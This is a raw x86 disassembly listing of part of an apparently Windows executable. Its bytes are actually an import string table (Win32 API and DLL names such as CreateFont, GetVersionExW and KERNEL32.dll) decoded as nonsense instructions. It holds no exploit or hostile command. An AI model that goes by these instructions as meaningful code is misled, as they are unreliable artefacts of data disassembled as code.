  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
